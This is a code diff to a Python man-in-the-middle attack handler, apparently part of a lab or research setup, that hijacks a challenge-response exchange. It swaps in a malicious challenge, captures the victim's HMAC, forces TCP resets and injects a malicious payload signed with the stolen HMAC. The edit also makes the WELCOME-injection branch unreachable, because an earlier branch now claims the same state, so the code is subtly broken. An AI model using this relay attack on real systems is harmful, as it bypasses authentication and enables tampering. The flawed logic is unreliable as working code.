@@ -131,15 +131,6 @@ class MitmAttackHandler:
             
         # Get the correct direction name based on IP addresses
         correct_direction = self.get_correct_direction_name(source_ip, target_ip) if source_ip and target_ip else self.direction_name
-        
-        # Reset state if this is a new connection (new source IP or target IP)
-        if source_ip and target_ip:
-            connection_key = f"{source_ip}:{target_ip}"
-            if not hasattr(self, '_last_connection_key') or self._last_connection_key != connection_key:
-                if self.attack_log:
-                    logging.info(f"[MITM] New connection detected: {connection_key}, resetting attack state")
-                self._last_connection_key = connection_key
-                self.global_state.reset_state()
             
         self.global_state.state['message_count'] += 1
         
@@ -174,16 +165,12 @@ class MitmAttackHandler:
                 challenge_detected = True
                 
         if challenge_detected:
-            # Handle challenges in bob_to_alice direction (when Bob sends to Alice)
-            # OR if this is the first challenge we've seen (regardless of direction)
-            if ((correct_direction == 'bob_to_alice' and not self.global_state.state['active']) or
-                (not self.global_state.state['active'] and not self.global_state.state.get('challenge_seen'))):
-                
+            # Handle the first challenge we see (regardless of direction) to start the attack
+            if not self.global_state.state['active']:
                 self.global_state.state['active'] = True
                 self.global_state.state['phase'] = 'waiting_hmac'
                 self.global_state.state['original_challenge'] = original_data
                 self.global_state.state['connection_count'] += 1
-                self.global_state.state['challenge_seen'] = True
                 
                 if self.attack_log:
                     logging.info(f"[MITM] *** CHALLENGE DETECTED on connection #{self.global_state.state['connection_count']} ***")
@@ -191,8 +178,8 @@ class MitmAttackHandler:
                     logging.info(f"[MITM] Original data length: {len(original_data)} bytes")
                     logging.info(f"[MITM] Direction: {correct_direction}")
                 
-                # Get the correct malicious payload for this direction
-                malicious_payload_hex = self.get_attack_payload_for_direction(source_ip, target_ip) if source_ip and target_ip else self.attack_payload_hex
+                # Get the malicious payload for bob_to_alice direction (where we intercept Bob's challenge)
+                malicious_payload_hex = self.payload_handler.get_attack_payload("bob_to_alice")
                 
                 # Instead of forwarding Bob's challenge, send our own malicious challenge
                 malicious_bytes = b''
@@ -211,7 +198,7 @@ class MitmAttackHandler:
                         malicious_bytes = b''
                 else:
                     if self.attack_log:
-                        logging.warning(f"[MITM] No malicious payload configured for direction {correct_direction}, sending empty payload")
+                        logging.warning(f"[MITM] No malicious payload configured for bob_to_alice direction")
                 
                 # Send the malicious challenge to Alice
                 writer.write(malicious_bytes)
@@ -220,14 +207,13 @@ class MitmAttackHandler:
                     logging.info(f"[MITM] *** Sent malicious challenge to client ***")
                 return False
             else:
-                # In alice_to_bob direction or already active, forward normally
+                # Already active, forward normally
                 if self.attack_log:
-                    logging.info(f"[MITM] Forwarding challenge normally (direction: {correct_direction}, active: {self.global_state.state['active']})")
+                    logging.info(f"[MITM] Forwarding challenge normally (already active)")
                 return True
                 
         # Detect HMAC from client (Alice) - this should be the response to our malicious challenge
-        elif (correct_direction == 'alice_to_bob' and 
-              self.global_state.state['active'] and 
+        elif (self.global_state.state['active'] and 
               self.global_state.state['phase'] == 'waiting_hmac' and 
               isinstance(raw_msg, (bytes, str))):
             # Check if this looks like an HMAC response (not a challenge or welcome)
@@ -238,41 +224,21 @@ class MitmAttackHandler:
                     logging.info(f"[MITM] *** HMAC DETECTED from client ***")
                     logging.info(f"[MITM] HMAC content: {str(raw_msg)[:100]}")
                     logging.info(f"[MITM] HMAC data length: {len(original_data)} bytes")
-                    logging.info(f"[MITM] Forcing TCP RST.")
+                    logging.info(f"[MITM] Forcing TCP RST on all connections.")
                 
-                # Signal that we need to reset the connection
+                # Signal that we need to reset ALL connections for a clean state
                 # Return a special value to indicate RST needed
-                return "RST_CONNECTION"
+                return "RST_ALL_CONNECTIONS"
                 
-        # After reconnect, forward Bob's new challenge normally (don't replay old one)
-        elif (correct_direction == 'bob_to_alice' and
-              self.global_state.state['active'] and 
-              self.global_state.state['phase'] == 'waiting_reconnect' and 
-              isinstance(raw_msg, (bytes, str))):
-            # Check if this is a new challenge from Bob after reconnect
-            challenge_detected = False
-            if isinstance(raw_msg, str):
-                if raw_msg.startswith('#CHALLENGE#'):
-                    challenge_detected = True
-                elif '#CHALLENGE#' in raw_msg:
-                    challenge_detected = True
-            elif isinstance(raw_msg, bytes):
-                if b'#CHALLENGE#' in raw_msg:
-                    challenge_detected = True
-                    
-            if challenge_detected:
-                if self.attack_log:
-                    logging.info(f"[MITM] *** New challenge after reconnect, forwarding normally for authentication ***")
-                # Forward this challenge normally to let Alice authenticate
-                self.global_state.state['phase'] = 'waiting_welcome'
-                return True  # Forward the message
-            else:
-                # Not a challenge, continue waiting
-                return False
+        # After reconnect, forward challenges normally until we see WELCOME
+        elif (self.global_state.state['active'] and 
+              self.global_state.state['phase'] == 'waiting_reconnect'):
+            # Forward all messages normally until we see WELCOME
+            return True
                 
         # Detect WELCOME message to transition to payload injection phase
         elif (self.global_state.state['active'] and 
-              self.global_state.state['phase'] == 'waiting_welcome' and
+              self.global_state.state['phase'] == 'waiting_reconnect' and
               isinstance(raw_msg, (bytes, str))):
             welcome_detected = False
             if isinstance(raw_msg, str) and raw_msg.startswith('#WELCOME#'):
@@ -297,8 +263,8 @@ class MitmAttackHandler:
                 if self.attack_log:
                     logging.info(f"[MITM] *** Injecting malicious payload with captured HMAC after successful authentication ***")
                 
-                # Get the correct malicious payload for this direction
-                malicious_payload_hex = self.get_attack_payload_for_direction(source_ip, target_ip) if source_ip and target_ip else self.attack_payload_hex
+                # Get the malicious payload for bob_to_alice direction
+                malicious_payload_hex = self.payload_handler.get_attack_payload("bob_to_alice")
                 
                 # Craft the malicious package: malicious payload + captured HMAC
                 malicious_package = b''
